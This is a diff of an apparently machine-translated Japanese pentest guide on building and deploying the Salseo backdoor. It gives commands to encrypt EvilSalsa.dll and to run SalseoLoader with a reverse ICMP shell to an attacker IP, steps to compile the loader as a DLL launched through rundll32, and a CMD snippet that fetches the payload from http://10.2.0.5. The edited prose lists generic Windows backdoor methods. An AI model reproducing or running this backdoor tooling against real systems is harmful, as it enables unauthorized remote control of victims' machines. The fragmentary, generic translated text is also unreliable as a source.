@@ -39,29 +39,25 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 ### Windows
 
-Windowsは、バックドアを作成するためのさまざまな方法を提供します。以下にいくつかの一般的な手法を紹介します。
+Windows（ウィンドウズ）は、最も一般的なオペレーティングシステムの1つであり、多くのバージョンが存在します。Windowsには、バックドアを作成してシステムに不正アクセスするためのさまざまな方法があります。
 
 #### リモートデスクトップ
 
-リモートデスクトップ（RDP）は、Windowsマシンにリモートでアクセスするための機能です。バックドアを作成するために、攻撃者はRDPを利用してWindowsマシンにアクセスし、システムに対する制御を取得します。
+リモートデスクトップは、Windowsマシンにリモートでアクセスするための便利な機能です。しかし、この機能は悪意のある攻撃者にとっても有用です。攻撃者は、リモートデスクトップを使用してシステムにアクセスし、バックドアをインストールすることができます。
 
-#### バックドアアプリケーション
+#### サービス
 
-バックドアアプリケーションは、Windowsマシンにインストールされたアプリケーションの中に隠されたバックドア機能を持つものです。攻撃者は、バックドアアプリケーションを使用してWindowsマシンにアクセスし、システムに対する制御を取得します。
+Windowsでは、バックドアを作成するためにサービスを利用することができます。攻撃者は、システムにバックドアをインストールするために、既存のサービスを悪用することができます。また、攻撃者は、新しいサービスを作成してバックドアを実装することもできます。
 
-#### サービスの改ざん
+#### レジストリ
 
-Windowsでは、サービスと呼ばれるバックグラウンドプロセスが実行されています。攻撃者は、サービスの改ざんを行い、バックドアを作成します。これにより、攻撃者はWindowsマシンにアクセスし、システムに対する制御を取得することができます。
+Windowsのレジストリは、システムの設定情報を格納するデータベースです。攻撃者は、レジストリを悪用してバックドアを作成することができます。レジストリを変更することで、システムの動作を変更し、バックドアを実装することができます。
 
-#### レジストリの改ざん
+#### シェル拡張
 
-Windowsのレジストリは、システムの設定情報を格納しています。攻撃者は、レジストリの改ざんを行い、バックドアを作成します。これにより、攻撃者はWindowsマシンにアクセスし、システムに対する制御を取得することができます。
+Windowsでは、シェル拡張を使用してバックドアを作成することもできます。シェル拡張は、エクスプローラーの機能を拡張するためのプラグインです。攻撃者は、シェル拡張を悪用してバックドアを実装することができます。
 
-#### ファイルの改ざん
-
-Windowsでは、重要なシステムファイルが存在します。攻撃者は、これらのファイルを改ざんし、バックドアを作成します。これにより、攻撃者はWindowsマシンにアクセスし、システムに対する制御を取得することができます。
-
-これらは、Windowsでバックドアを作成するための一般的な手法の一部です。攻撃者は、これらの手法を使用してWindowsマシンに侵入し、システムに対する制御を取得することができます。
+これらは、Windowsでバックドアを作成するための一般的な方法のいくつかです。攻撃者は、これらの方法を使用してシステムに不正アクセスし、機密情報を盗むなどの悪意のある活動を行うことができます。
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -109,65 +105,65 @@ python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
-## DLLのエクスポートメイン関数としてのSalseoLoaderのコンパイル
+## DLLのエクスポートメイン関数としてSalseoLoaderをコンパイルする
 
 Visual Studioを使用してSalseoLoaderプロジェクトを開きます。
 
-### メイン関数の前に\[DllExport]を追加します。
+### メイン関数の前に\[DllExport]を追加します
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-### このプロジェクトにDllExportをインストールします。
+### このプロジェクトにDllExportをインストールします
 
 #### **ツール** --> **NuGetパッケージマネージャー** --> **ソリューションのNuGetパッケージを管理...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **DllExportパッケージを検索（ブラウズタブを使用）し、インストールボタンを押します（ポップアップを受け入れます）**
+#### **DllExportパッケージを検索します（ブラウズタブを使用）し、インストールを押します（ポップアップを受け入れます）**
 
-![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png>)
 
-プロジェクトフォルダには、**DllExport.bat**と**DllExport\_Configure.bat**のファイルが表示されます。
+プロジェクトフォルダには、**DllExport.bat**と**DllExport\_Configure.bat**のファイルが表示されます
 
-### DllExportをアンインストールします。
+### DllExportをアンインストールします
 
 **アンインストール**を押します（はい、奇妙ですが、信じてください、必要です）
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
-### Visual Studioを終了し、DllExport\_configureを実行します。
+### Visual Studioを終了し、DllExport\_configureを実行します
 
-Visual Studioを**終了**します。
+Visual Studioを**終了**します
 
-次に、**SalseoLoaderフォルダ**に移動し、**DllExport\_Configure.bat**を実行します。
+次に、**SalseoLoaderフォルダ**に移動し、**DllExport\_Configure.bat**を実行します
 
-**x64**を選択します（x64ボックス内で使用する場合、私の場合はそうでした）、**System.Runtime.InteropServices**（**DllExportの名前空間内**）を選択し、**Apply**を押します。
+**x64**を選択します（x64ボックス内で使用する場合、私の場合はそうでした）、**System.Runtime.InteropServices**（**DllExportの名前空間内**）を選択し、**Apply**を押します
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1).png>)
 
-### Visual Studioでプロジェクトを再度開きます。
+### Visual Studioでプロジェクトを再度開きます
 
-**\[DllExport]**はもはやエラーとしてマークされません。
+**\[DllExport]**はもはやエラーとしてマークされません
 
 ![](<../.gitbook/assets/image (8) (1).png>)
 
-### ソリューションをビルドします。
+### ソリューションをビルドします
 
 **出力の種類 = クラスライブラリ**を選択します（プロジェクト --> SalseoLoaderのプロパティ --> アプリケーション --> 出力の種類 = クラスライブラリ）
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-**x64** **プラットフォーム**を選択します（プロジェクト --> SalseoLoaderのプロパティ --> ビルド --> プラットフォームのターゲット = x64）
+**x64プラットフォーム**を選択します（プロジェクト --> SalseoLoaderのプロパティ --> ビルド --> プラットフォームのターゲット = x64）
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
 ソリューションを**ビルド**するには：ビルド --> ソリューションのビルド（出力コンソールに新しいDLLのパスが表示されます）
 
-### 生成されたDLLをテストします。
+### 生成されたDLLをテストします
 
 テストしたい場所にDLLをコピーして貼り付けます。
 
-実行するコマンド：
+実行します：
 ```
 rundll32.exe SalseoLoader.dll,main
 ```
@@ -188,13 +184,23 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It provides a way to interact with the operating system by executing commands. CMD can be used to perform various tasks, such as navigating through directories, running programs, managing files and folders, and configuring system settings.
+CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It allows users to interact with the operating system by executing commands. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.
 
-CMD is a powerful tool for hackers as it allows them to execute commands and scripts to exploit vulnerabilities, gain unauthorized access, and perform various malicious activities on a target system. It provides a direct interface to the underlying operating system, giving hackers control over the system's resources and functionalities.
+CMD provides a wide range of commands that can be used to carry out different operations. Some commonly used commands include:
 
-Hackers can use CMD to execute commands to gather information about the target system, such as network configuration, running processes, and user accounts. They can also use CMD to launch attacks, such as brute-forcing passwords, injecting malicious code, and creating backdoors for persistent access.
+- `cd`: Change directory
+- `dir`: List files and directories
+- `mkdir`: Create a new directory
+- `del`: Delete files
+- `copy`: Copy files
+- `move`: Move files
+- `ren`: Rename files
+- `tasklist`: List running processes
+- `taskkill`: Terminate a running process
 
-It is important for system administrators and users to be aware of the potential risks associated with CMD and take necessary precautions to secure their systems. Regularly updating the operating system, using strong passwords, and implementing security measures can help mitigate the risks associated with CMD-based attacks.
+CMD can also be used to execute batch scripts, which are a series of commands stored in a text file with the extension `.bat` or `.cmd`. Batch scripts allow users to automate repetitive tasks by running multiple commands sequentially.
+
+Overall, CMD is a powerful tool for managing and controlling the Windows operating system through the command line interface.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
